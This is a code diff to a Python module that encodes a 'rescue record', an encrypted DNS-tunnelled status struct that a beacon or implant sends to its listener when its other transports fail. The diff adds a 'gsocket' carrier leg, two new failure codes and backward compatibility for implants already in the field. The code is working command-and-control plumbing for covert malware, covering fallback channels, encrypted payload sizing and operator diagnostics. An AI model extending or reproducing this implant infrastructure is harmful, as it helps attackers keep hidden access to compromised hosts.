@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""The rescue record: ten bytes that say why a beacon cannot get out.
+"""The rescue record: nineteen bytes that say why a beacon cannot get out.
 
 When every upstream leg has failed, the beacon's one remaining channel is
 DNS, and DNS carries nothing upstream — a bare TXT query with the agent id
@@ -32,17 +32,23 @@ import math
 import struct
 from typing import Dict, Tuple
 
-VERSION = 1
+VERSION = 2
 
 # The marker label that tells the listener this query carries a payload.
 # `b` is the tasking query's marker; a separate letter means the listener
 # decides by name and never by counting labels.
 MARKER = "r"
 
-# The transports, in the order they are packed. This is the beacon's
-# `_FALLBACK_TRANSPORTS` order, and it is positional in the struct, so it
-# is not a detail a later reader may reorder for tidiness.
-TRANSPORTS = ("https", "dns", "smb", "quic")
+# The transports, in the order they are packed. It is positional in the
+# struct, so it is not a detail a later reader may reorder for tidiness:
+# `gsocket` was appended at version 2 rather than slotted in beside the
+# other outbound legs for exactly that reason.
+TRANSPORTS = ("https", "dns", "smb", "quic", "gsocket")
+
+# The four a version 1 record names, which is what every implant deployed
+# before the carrier leg existed still sends. They are the first four of
+# `TRANSPORTS`, and `unpack` keeps reading them.
+TRANSPORTS_V1 = ("https", "dns", "smb", "quic")
 
 # Why a leg produced nothing. `not_attempted` is zero so that an unset
 # field in the struct reads as the truth: the loop short-circuits, and a
@@ -62,6 +68,13 @@ CLASSES = {
     "auth_required": 7,
     "bad_payload": 8,
     "resolve_failed": 9,
+    # The two the carrier leg adds. A leg that needs a helper process has
+    # two failures no socket has, and collapsing them into `unreachable`
+    # would send an operator looking at the network for a missing file:
+    # the carrier binary was not on the host at all, and the carrier was
+    # there and died or never came up.
+    "binary_missing": 10,
+    "carrier_failed": 11,
 }
 
 FLAG_PROXY_FOUND = 0x01
@@ -85,13 +98,31 @@ WRAPPER_KEY = "r"
 # authentication — does not fit in a byte. Nor does any three-digit status
 # above 255. One byte would have meant dropping the best diagnostic or
 # encoding it as an offset a reader has to undo in their head.
-_STRUCT = struct.Struct("!BHBHBHBHBHB")
+#
+# Both versions live here because the field keeps sending v1. An implant is
+# deployed once and updated never: dropping the old struct would turn every
+# record from a beacon installed before the carrier leg into "unreadable",
+# which is the one answer this channel exists to avoid.
+_STRUCT_V1 = struct.Struct("!BHBHBHBHBHB")     # 16 bytes, four transports
+_STRUCT = struct.Struct("!BHBHBHBHBHBHB")      # 19 bytes, five
 RECORD_BYTES = _STRUCT.size
+
+# What `unpack` accepts, keyed by length, because the length is the only
+# thing it can trust before it has read the version byte -- and a version a
+# record's own length contradicts is a record this file must not read
+# optimistically. Each entry is (version, struct, transports named).
+_LAYOUTS = {
+    _STRUCT_V1.size: (1, _STRUCT_V1, TRANSPORTS_V1),
+    _STRUCT.size: (VERSION, _STRUCT, TRANSPORTS),
+}
 
 # What the full chain produces, so a change to the record or to `_encrypt`'s
 # wrapper shows up as a failing assertion rather than a third label:
-#   16 bytes -> base64 24 -> {"r":"..."} 32 -> AES-GCM 60 -> base32 96
-PAYLOAD_CHARS = 96
+#   19 bytes -> base64 28 -> {"r":"..."} 36 -> AES-GCM 64 -> base32 103
+# The fifth transport cost seven of those characters, and the margin to
+# `_MAX_PAYLOAD_CHARS` is now 23 -- nine more bytes of record, which is
+# three more transports, before two labels stop holding it.
+PAYLOAD_CHARS = 103
 
 # Two labels of 63. Past this the name would need a third, which no
 # listener parses, so it is refused rather than emitted.
@@ -153,20 +184,38 @@ def pack(per_transport: Dict[str, Tuple[int, int]], flags: int,
 def unpack(raw: bytes) -> dict:
     """The record, as a dict. Raises on a wrong length or an unknown version.
 
-    A version this file does not know is refused rather than read
-    optimistically: the struct would still unpack, and the result would be
-    a confident lie about which leg failed how.
+    Both record lengths are accepted: 16 bytes from an implant deployed
+    before the carrier leg existed, 19 from one that has it. The length
+    chooses the struct, because it is the only thing known before the
+    version byte is trusted, and the version must then agree with it -- a
+    v1 record claiming version 2 is as likely to be a probe as a bug, and
+    reading it either way would be a confident lie about which leg failed.
+
+    A version this file does not know at all is refused for the same
+    reason: the struct would still unpack and the result would still look
+    like a diagnosis.
+
+    Every caller sees all five transports whatever arrived. A v1 record
+    names four, and `gsocket` reads as `not_attempted` -- which is the
+    truth about a beacon whose build had no carrier leg.
     """
-    if not isinstance(raw, (bytes, bytearray)) or len(raw) != RECORD_BYTES:
-        raise ValueError("a record is exactly %d bytes, got %r"
-                         % (RECORD_BYTES, len(raw) if raw is not None else raw))
-    values = _STRUCT.unpack(bytes(raw))
+    if not isinstance(raw, (bytes, bytearray)) or len(raw) not in _LAYOUTS:
+        raise ValueError(
+            "a record is %s bytes, got %r"
+            % (" or ".join(str(n) for n in sorted(_LAYOUTS)),
+               len(raw) if raw is not None else raw))
+    expected_version, layout, named = _LAYOUTS[len(raw)]
+    values = layout.unpack(bytes(raw))
     version = values[0]
-    if version != VERSION:
-        raise ValueError("record version %d is not %d" % (version, VERSION))
+    if version != expected_version:
+        raise ValueError("record version %d is not %d, which is what %d "
+                         "bytes carries"
+                         % (version, expected_version, len(raw)))
     out = {"version": version, "fingerprint": values[1],
            "flags": values[-1]}
-    for index, name in enumerate(TRANSPORTS):
+    for name in TRANSPORTS:
+        out[name] = (CLASSES["not_attempted"], 0)
+    for index, name in enumerate(named):
         out[name] = (values[2 + index * 2], values[3 + index * 2])
     return out
 
